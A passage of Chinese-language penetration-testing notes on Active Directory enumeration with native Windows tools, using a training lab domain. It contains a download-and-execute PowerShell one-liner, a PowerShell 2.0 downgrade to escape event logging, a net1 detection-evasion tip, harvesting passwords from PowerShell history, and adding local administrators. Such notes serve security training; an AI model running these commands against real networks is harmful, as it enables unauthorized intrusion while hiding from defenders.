class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">09</span>:<span class="number">33</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Development</span>\<span class="type">GetUpdate.psafe3</span>) <span class="type">.psafe3</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.keypair</span><span class="variable">$</span>|<span class="number">278</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">09</span>:<span class="number">09</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Infosec</span>\<span class="type">UnprotectConvertTo.keypair</span>) <span class="type">.keypair</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Black</span>&#125;&lt;<span class="type">KeepExtExactBlack</span>|<span class="type">R</span>|^\<span class="type">.tblk</span><span class="variable">$</span>|<span class="number">280</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">05</span>:<span class="number">17</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Development</span>\<span class="type">ExportJoin.tblk</span>) <span class="type">.tblk</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.mdf</span><span class="variable">$</span>|<span class="number">305</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">09</span>:<span class="number">27</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Development</span>\<span class="type">FormatShow.mdf</span>) <span class="type">.mdf</span></span><br><span class="line"><span class="number">2022</span>-<span class="number">03</span>-<span class="number">31</span> <span class="number">12</span>:<span class="number">17</span>:<span class="number">19</span> -<span class="number">07</span>:<span class="number">00</span> [<span class="type">File</span>] &#123;<span class="type">Red</span>&#125;&lt;<span class="type">KeepExtExactRed</span>|<span class="type">R</span>|^\<span class="type">.mdf</span><span class="variable">$</span>|<span class="number">299</span><span class="type">B</span>|<span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">12</span>:<span class="number">09</span>:<span class="number">14</span> <span class="type">PM</span>&gt;(\\<span class="type">ACADEMY</span>-<span class="type">EA</span>-<span class="type">DC01.INLANEFREIGHT.LOCAL</span>\<span class="type">Department</span> <span class="type">Shares</span>\<span class="type">IT</span>\<span class="type">Development</span>\<span class="type">LockConfirm.mdf</span>) <span class="type">.mdf</span></span><br><span class="line"></span><br><span class="line">&lt;<span class="type">SNIP</span>&gt;</span><br></pre></td></tr></table></figure><hr><h1 id="Living-Off-The-Land"><a href="#Living-Off-The-Land" class="headerlink" title="Living Off The Land"></a>Living Off The Land</h1><p>环境受限，使用 Windows&#x2F;Active Directory 原生的工具和命令。</p><h2 id="Basic-enum"><a href="#Basic-enum" class="headerlink" title="Basic enum"></a>Basic enum</h2><h3 id="Basic-Command"><a href="#Basic-Command" class="headerlink" title="Basic Command"></a>Basic Command</h3><table><thead><tr><th>Command</th><th>Result</th></tr></thead><tbody><tr><td><code>hostname</code></td><td>打印 PC 的名称</td></tr><tr><td><code>[System.Environment]::OSVersion.Version</code></td><td>打印出操作系统版本和修订级别</td></tr><tr><td><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></td><td>打印应用于主机的补丁和热修复程序</td></tr><tr><td><code>ipconfig /all</code></td><td>打印出网络适配器状态和配置</td></tr><tr><td><code>set</code></td><td>显示当前会话的环境变量列表（从 CMD 提示符运行）</td></tr><tr><td><code>echo %USERDOMAIN%</code></td><td>显示主机所属的域名（从 CMD 提示符运行）</td></tr><tr><td><code>echo %logonserver%</code></td><td>打印出主机签入的域控制器的名称（从 CMD 提示符运行）</td></tr><tr><td><code>systeminfo</code></td><td>显示有关计算机及其操作系统的详细配置信息，包括操作系统配置、安全信息、产品 ID 和硬件属性（如 RAM、磁盘空间和网卡）。</td></tr></tbody></table><h3 id="PowerShell-1"><a href="#PowerShell-1" class="headerlink" title="PowerShell"></a>PowerShell</h3><p>PowerShell 自 2006 年问世以来，为 Windows 系统管理员提供了一个广泛的框架，用于管理 Windows 系统和 AD 环境的各个方面。它是一种功能强大的脚本语言，可用于深入研究系统。PowerShell 有许多内置函数和模块，可以在交战中使用这些函数和模块来侦察主机和网络以及发送和接收文件。</p><table><thead><tr><th>Cmd-Let</th><th>describe</th></tr></thead><tbody><tr><td><code>Get-Module</code></td><td>列出可供使用的已加载模块。</td></tr><tr><td><code>Get-ExecutionPolicy -List</code></td><td>将打印主机上每个范围的<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2">执行策略设置。</a></td></tr><tr><td><code>Set-ExecutionPolicy Bypass -Scope Process</code></td><td>这将使用该参数更改当前进程的策略<code>-Scope</code>。一旦退出或终止该进程，此操作将恢复该策略。这是理想的，因为不会对受害主机进行永久性更改。</td></tr><tr><td><code>Get-Content C:\Users\&lt;USERNAME&gt;\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt</code></td><td>通过此字符串，可以获取指定用户的 PowerShell 历史记录。这非常有用，因为命令历史记录可能包含密码或指向包含密码的配置文件或脚本。</td></tr><tr><td>&#96;Get-ChildItem Env:</td><td>ft Key,Value&#96;</td></tr><tr><td><code>powershell -nop -c &quot;iex(New-Object Net.WebClient).DownloadString(&#39;URL to download the file from&#39;); &lt;follow-on commands&gt;&quot;</code></td><td>这是一种使用 PowerShell 从 Web 下载文件并从内存中调用它的快速简便的方法。</td></tr></tbody></table><h4 id="Powershell-downgrade"><a href="#Powershell-downgrade" class="headerlink" title="Powershell downgrade"></a>Powershell downgrade</h4><p>主机上通常存在多个版本的 PowerShell。如果不卸载，它们仍然可以使用。Powershell 事件日志记录是 Powershell 3.0 及更高版本引入的功能。考虑到这一点，可以尝试调用 Powershell 2.0 或更早版本。如果成功，在 shell 中的操作将不会记录在事件查看器中。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-host</span></span><br><span class="line"></span><br><span class="line">Name             : ConsoleHost</span><br><span class="line">Version          : <span class="number">5.1</span>.<span class="number">19041.1320</span></span><br><span class="line">InstanceId       : <span class="number">18</span>ee9fb4<span class="literal">-ac42-4dfe-85b2-61687291bbfc</span></span><br><span class="line">UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface</span><br><span class="line">CurrentCulture   : en<span class="literal">-US</span></span><br><span class="line">CurrentUICulture : en<span class="literal">-US</span></span><br><span class="line">PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy</span><br><span class="line">DebuggerEnabled  : True</span><br><span class="line">IsRunspacePushed : False</span><br><span class="line">Runspace         : System.Management.Automation.Runspaces.LocalRunspace</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; powershell.exe <span class="literal">-version</span> <span class="number">2</span></span><br><span class="line">Windows PowerShell</span><br><span class="line">Copyright (C) <span class="number">2009</span> Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-host</span></span><br><span class="line">Name             : ConsoleHost</span><br><span class="line">Version          : <span class="number">2.0</span></span><br><span class="line">InstanceId       : <span class="number">121</span>b807c<span class="literal">-6daa-4691-85ef-998ac137e469</span></span><br><span class="line">UI               : System.Management.Automation.Internal.Host.InternalHostUserInterface</span><br><span class="line">CurrentCulture   : en<span class="literal">-US</span></span><br><span class="line">CurrentUICulture : en<span class="literal">-US</span></span><br><span class="line">PrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy</span><br><span class="line">IsRunspacePushed : False</span><br><span class="line">Runspace         : System.Management.Automation.Runspaces.LocalRunspace</span><br><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">get-module</span></span><br><span class="line"></span><br><span class="line">ModuleType Version    Name                                ExportedCommands</span><br><span class="line"><span class="literal">----------</span> <span class="literal">-------</span>    <span class="literal">----</span>                                <span class="literal">----------------</span></span><br><span class="line">Script     <span class="number">0.0</span>        chocolateyProfile                   &#123;TabExpansion, <span class="built_in">Update-SessionEnvironment</span>, refreshenv&#125;</span><br><span class="line">Manifest   <span class="number">3.1</span>.<span class="number">0.0</span>    Microsoft.PowerShell.Management     &#123;<span class="built_in">Add-Computer</span>, <span class="built_in">Add-Content</span>, <span class="built_in">Checkpoint-Computer</span>, <span class="built_in">Clear-Content</span>...&#125;</span><br><span class="line">Manifest   <span class="number">3.1</span>.<span class="number">0.0</span>    Microsoft.PowerShell.Utility        &#123;<span class="built_in">Add-Member</span>, <span class="built_in">Add-Type</span>, <span class="built_in">Clear-Variable</span>, <span class="built_in">Compare-Object</span>...&#125;</span><br><span class="line">Script     <span class="number">0.7</span>.<span class="number">3.1</span>    posh<span class="literal">-git</span>                            &#123;<span class="built_in">Add-PoshGitToProfile</span>, <span class="built_in">Add-SshKey</span>, <span class="built_in">Enable-GitColors</span>, <span class="built_in">Expand-GitCommand</span>...&#125;</span><br><span class="line">Script     <span class="number">2.0</span>.<span class="number">0</span>      PSReadline                          &#123;<span class="built_in">Get-PSReadLineKeyHandler</span>, <span class="built_in">Get-PSReadLineOption</span>, <span class="built_in">Remove-PSReadLineKeyHandler</span>...</span><br></pre></td></tr></table></figure><h3 id="Firewall"><a href="#Firewall" class="headerlink" title="Firewall"></a>Firewall</h3><p><a href="https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts">netsh</a>和<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query">sc</a>实用程序来帮助了解 Windows 防火墙设置方面的主机状态并检查 Windows Defender 的状态。</p><h4 id="netsh"><a href="#netsh" class="headerlink" title="netsh"></a>netsh</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; netsh advfirewall show allprofiles</span><br><span class="line"></span><br><span class="line">Domain Profile Settings:</span><br><span class="line"><span class="literal">----------------------------------------------------------------------</span></span><br><span class="line">State                                 OFF</span><br><span class="line">Firewall Policy                       BlockInbound,AllowOutbound</span><br><span class="line">LocalFirewallRules                    N/A (GPO<span class="literal">-store</span> only)</span><br><span class="line">LocalConSecRules                      N/A (GPO<span class="literal">-store</span> only)</span><br><span class="line">InboundUserNotification               Disable</span><br><span class="line">RemoteManagement                      Disable</span><br><span class="line">UnicastResponseToMulticast            Enable</span><br><span class="line"></span><br><span class="line">Logging:</span><br><span class="line">LogAllowedConnections                 Disable</span><br><span class="line">LogDroppedConnections                 Disable</span><br><span class="line">FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log</span><br><span class="line">MaxFileSize                           <span class="number">4096</span></span><br><span class="line"></span><br><span class="line">Private Profile Settings:</span><br><span class="line"><span class="literal">----------------------------------------------------------------------</span></span><br><span class="line">State                                 OFF</span><br><span class="line">Firewall Policy                       BlockInbound,AllowOutbound</span><br><span class="line">LocalFirewallRules                    N/A (GPO<span class="literal">-store</span> only)</span><br><span class="line">LocalConSecRules                      N/A (GPO<span class="literal">-store</span> only)</span><br><span class="line">InboundUserNotification               Disable</span><br><span class="line">RemoteManagement                      Disable</span><br><span class="line">UnicastResponseToMulticast            Enable</span><br><span class="line"></span><br><span class="line">Logging:</span><br><span class="line">LogAllowedConnections                 Disable</span><br><span class="line">LogDroppedConnections                 Disable</span><br><span class="line">FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log</span><br><span class="line">MaxFileSize                           <span class="number">4096</span></span><br><span class="line"></span><br><span class="line">Public Profile Settings:</span><br><span class="line"><span class="literal">----------------------------------------------------------------------</span></span><br><span class="line">State                                 OFF</span><br><span class="line">Firewall Policy                       BlockInbound,AllowOutbound</span><br><span class="line">LocalFirewallRules                    N/A (GPO<span class="literal">-store</span> only)</span><br><span class="line">LocalConSecRules                      N/A (GPO<span class="literal">-store</span> only)</span><br><span class="line">InboundUserNotification               Disable</span><br><span class="line">RemoteManagement                      Disable</span><br><span class="line">UnicastResponseToMulticast            Enable</span><br><span class="line"></span><br><span class="line">Logging:</span><br><span class="line">LogAllowedConnections                 Disable</span><br><span class="line">LogDroppedConnections                 Disable</span><br><span class="line">FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log</span><br><span class="line">MaxFileSize                           <span class="number">4096</span></span><br></pre></td></tr></table></figure><h4 id="sc"><a href="#sc" class="headerlink" title="sc"></a>sc</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc</span> <span class="title">query</span> <span class="title">windefend</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SERVICE_NAME</span>: <span class="title">windefend</span></span></span><br><span class="line"><span class="function">        <span class="title">TYPE</span>               : 10  <span class="title">WIN32_OWN_PROCESS</span></span></span><br><span class="line"><span class="function">        <span class="title">STATE</span>              : 4  <span class="title">RUNNING</span></span></span><br><span class="line"><span class="function">                                (<span class="title">STOPPABLE</span>, <span class="title">NOT_PAUSABLE</span>, <span class="title">ACCEPTS_SHUTDOWN</span>)</span></span><br><span class="line"><span class="function">        <span class="title">WIN32_EXIT_CODE</span>    : 0  (0<span class="title">x0</span>)</span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_EXIT_CODE</span>  : 0  (0<span class="title">x0</span>)</span></span><br><span class="line"><span class="function">        <span class="title">CHECKPOINT</span>         : 0<span class="title">x0</span></span></span><br><span class="line"><span class="function">        <span class="title">WAIT_HINT</span>          : 0<span class="title">x0</span></span></span><br></pre></td></tr></table></figure><h4 id="Get-MpComputerStatus"><a href="#Get-MpComputerStatus" class="headerlink" title="Get-MpComputerStatus"></a>Get-MpComputerStatus</h4><p>下面使用 PowerShell 中的 Get-MpComputerStatuscmdlet 检查状态和配置设置。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-MpComputerStatus</span></span><br><span class="line"></span><br><span class="line">AMEngineVersion                  : <span class="number">1.1</span>.<span class="number">19000.8</span></span><br><span class="line">AMProductVersion                 : <span class="number">4.18</span>.<span class="number">2202.4</span></span><br><span class="line">AMRunningMode                    : Normal</span><br><span class="line">AMServiceEnabled                 : True</span><br><span class="line">AMServiceVersion                 : <span class="number">4.18</span>.<span class="number">2202.4</span></span><br><span class="line">AntispywareEnabled               : True</span><br><span class="line">AntispywareSignatureAge          : <span class="number">0</span></span><br><span class="line">AntispywareSignatureLastUpdated  : <span class="number">3</span>/<span class="number">21</span>/<span class="number">2022</span> <span class="number">4</span>:<span class="number">06</span>:<span class="number">15</span> AM</span><br><span class="line">AntispywareSignatureVersion      : <span class="number">1.361</span>.<span class="number">414.0</span></span><br><span class="line">AntivirusEnabled                 : True</span><br><span class="line">AntivirusSignatureAge            : <span class="number">0</span></span><br><span class="line">AntivirusSignatureLastUpdated    : <span class="number">3</span>/<span class="number">21</span>/<span class="number">2022</span> <span class="number">4</span>:<span class="number">06</span>:<span class="number">16</span> AM</span><br><span class="line">AntivirusSignatureVersion        : <span class="number">1.361</span>.<span class="number">414.0</span></span><br><span class="line">BehaviorMonitorEnabled           : True</span><br><span class="line">ComputerID                       : FDA97E38<span class="literal">-1666-4534-98D4-943A9A871482</span></span><br><span class="line">ComputerState                    : <span class="number">0</span></span><br><span class="line">DefenderSignaturesOutOfDate      : False</span><br><span class="line">DeviceControlDefaultEnforcement  : Unknown</span><br><span class="line">DeviceControlPoliciesLastUpdated : <span class="number">3</span>/<span class="number">20</span>/<span class="number">2022</span> <span class="number">9</span>:<span class="number">08</span>:<span class="number">34</span> PM</span><br><span class="line">DeviceControlState               : Disabled</span><br><span class="line">FullScanAge                      : <span class="number">4294967295</span></span><br><span class="line">FullScanEndTime                  :</span><br><span class="line">FullScanOverdue                  : False</span><br><span class="line">FullScanRequired                 : False</span><br><span class="line">FullScanSignatureVersion         :</span><br><span class="line">FullScanStartTime                :</span><br><span class="line">IoavProtectionEnabled            : True</span><br><span class="line">IsTamperProtected                : True</span><br><span class="line">IsVirtualMachine                 : False</span><br><span class="line">LastFullScanSource               : <span class="number">0</span></span><br><span class="line">LastQuickScanSource              : <span class="number">2</span></span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>了解主机的 AV 设置的修订版本以及启用&#x2F;禁用的设置，可以知道扫描运行的频率、按需威胁警报是否处于活动状态等等。这也是报告的重要信息。防御者通常可能认为某些设置已启用或扫描计划以特定间隔运行。</p><h4 id="qwinsta"><a href="#qwinsta" class="headerlink" title="qwinsta"></a>qwinsta</h4><p>用于显示远程桌面会话（RDP 会话）或终端服务会话的状态。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; qwinsta</span><br><span class="line"></span><br><span class="line"> SESSIONNAME       USERNAME                 ID  STATE   <span class="built_in">TYPE</span>        DEVICE</span><br><span class="line"> services                                    <span class="number">0</span>  Disc</span><br><span class="line">&gt;console           forend                    <span class="number">1</span>  Active</span><br><span class="line"> rdp<span class="literal">-tcp</span>                                 <span class="number">65536</span>  Listen</span><br></pre></td></tr></table></figure><h3 id="Network-Information"><a href="#Network-Information" class="headerlink" title="Network Information"></a>Network Information</h3><table><thead><tr><th>Command</th><th>Describe</th></tr></thead><tbody><tr><td><code>arp -a</code></td><td>列出存储在 arp 表中的所有已知主机。</td></tr><tr><td><code>ipconfig /all</code></td><td>打印出主机的适配器设置。可以从这里找出网段。</td></tr><tr><td><code>route print</code></td><td>显示识别已知网络和与主机共享的第三层路由的路由表（IPv4 和 IPv6）。</td></tr><tr><td><code>netsh advfirewall show state</code></td><td>显示主机防火墙的状态。可以确定它是否处于活动状态并过滤流量。</td></tr></tbody></table><h3 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h3><p><a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi">Windows 管理规范 (WMI)</a>是一种脚本引擎，广泛用于 Windows 企业环境中，用于检索信息并在本地和远程主机上运行管理任务。</p><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></td><td>打印补丁级别和应用的修补程序的描述</td></tr><tr><td><code>wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List</code></td><td>显示基本主机信息以包含列表中的任何属性</td></tr><tr><td><code>wmic process list /format:list</code></td><td>主机上所有进程的列表</td></tr><tr><td><code>wmic ntdomain list /format:list</code></td><td>显示有关域和域控制器的信息</td></tr><tr><td><code>wmic useraccount list /format:list</code></td><td>显示有关所有本地帐户以及已登录到设备的任何域帐户的信息</td></tr><tr><td><code>wmic group list /format:list</code></td><td>有关所有本地团体的信息</td></tr><tr><td><code>wmic sysaccount list /format:list</code></td><td>转储有关任何用作服务帐户的系统帐户的信息。</td></tr></tbody></table><p>查看有关域和子域的信息，以及当前域信任的外部林。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress</span><br><span class="line"></span><br><span class="line">Caption          Description      DnsForestName           DomainControllerAddress  DomainName</span><br><span class="line">ACADEMY<span class="literal">-EA-MS01</span>  ACADEMY<span class="literal">-EA-MS01</span></span><br><span class="line">INLANEFREIGHT    INLANEFREIGHT    INLANEFREIGHT.LOCAL     \\<span class="number">172.16</span>.<span class="number">5.5</span>             INLANEFREIGHT</span><br><span class="line">LOGISTICS        LOGISTICS        INLANEFREIGHT.LOCAL     \\<span class="number">172.16</span>.<span class="number">5.240</span>           LOGISTICS</span><br><span class="line">FREIGHTLOGISTIC  FREIGHTLOGISTIC  FREIGHTLOGISTICS.LOCAL  \\<span class="number">172.16</span>.<span class="number">5.238</span>           FREIGHTLOGISTIC</span><br></pre></td></tr></table></figure><h2 id="Credential-enum"><a href="#Credential-enum" class="headerlink" title="Credential enum"></a>Credential enum</h2><h3 id="net"><a href="#net" class="headerlink" title="net"></a>net</h3><p><a href="https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2">当尝试枚举域中的信息时， Net</a>命令对很有用。这些命令可用于查询本地主机和远程主机，就像 WMI 提供的功能一样。可以列出以下信息：</p><ul><li>Local and domain users</li><li>Groups</li><li>Hosts</li><li>Specific users in groups</li><li>Domain Controllers</li><li>Password requirements</li></ul><p><code>net.exe</code>命令通常由 EDR 解决方案监控，如果评估包含规避成分，这些命令可以快速泄露位置。一些组织甚至会配置其监控工具，以在特定 OU 中的用户运行某些命令时发出警报，例如营销助理的帐户运行诸如<code>whoami</code>、 和<code>net localgroup administrators</code>等命令。</p><table><thead><tr><th>Command</th><th>描述</th></tr></thead><tbody><tr><td><code>net accounts</code></td><td>有关密码要求的信息</td></tr><tr><td><code>net accounts /domain</code></td><td>密码和锁定策略</td></tr><tr><td><code>net group /domain</code></td><td>有关域组的信息</td></tr><tr><td><code>net group &quot;Domain Admins&quot; /domain</code></td><td>列出具有域管理员权限的用户</td></tr><tr><td><code>net group &quot;domain computers&quot; /domain</code></td><td>连接到域的 PC 列表</td></tr><tr><td><code>net group &quot;Domain Controllers&quot; /domain</code></td><td>列出域控制器的 PC 帐户</td></tr><tr><td><code>net group &lt;domain_group_name&gt; /domain</code></td><td>属于该组的用户</td></tr><tr><td><code>net groups /domain</code></td><td>域组列表</td></tr><tr><td><code>net localgroup</code></td><td>所有可用组</td></tr><tr><td><code>net localgroup administrators /domain</code></td><td>列出属于域内管理员组的用户（该组<code>Domain Admins</code>默认包含在这里）</td></tr><tr><td><code>net localgroup Administrators</code></td><td>关于群组（管理员）的信息</td></tr><tr><td><code>net localgroup administrators [username] /add</code></td><td>将用户添加到管理员</td></tr><tr><td><code>net share</code></td><td>查看当前共享</td></tr><tr><td><code>net user &lt;ACCOUNT_NAME&gt; /domain</code></td><td>获取域内用户的信息</td></tr><tr><td><code>net user /domain</code></td><td>列出域中的所有用户</td></tr><tr><td><code>net user %username%</code></td><td>有关当前用户的信息</td></tr><tr><td><code>net use x: \computer\share</code></td><td>本地安装共享</td></tr><tr><td><code>net view</code></td><td>获取计算机列表</td></tr><tr><td><code>net view /all /domain[:domainname]</code></td><td>域名上的共享</td></tr><tr><td><code>net view \computer /ALL</code></td><td>列出计算机的共享</td></tr><tr><td><code>net view /domain</code></td><td>域中的 PC 列表</td></tr></tbody></table><p>输入<code>net1</code>而不是<code>net</code>将执行相同的功能，规避检测。</p><h3 id="Dsquery"><a href="#Dsquery" class="headerlink" title="Dsquery"></a>Dsquery</h3><p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)">Dsquery</a>是一个有用的命令行工具，可用于查找 Active Directory 对象。<code>dsquery</code>将存在于<code>Active Directory Domain Services Role</code>安装了的任何主机上，并且<code>dsquery</code>DLL 现在默认存在于所有现代 Windows 系统上，可以在 找到<code>C:\Windows\System32\dsquery.dll</code>。</p><h4 id="users"><a href="#users" class="headerlink" title="users"></a>users</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; dsquery user</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=lab_adm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Htb Student,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Annie Vazquez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Paul Falcon,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Fae Anthony,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span></span><br><span class="line"><span class="string">&quot;CN=Walter 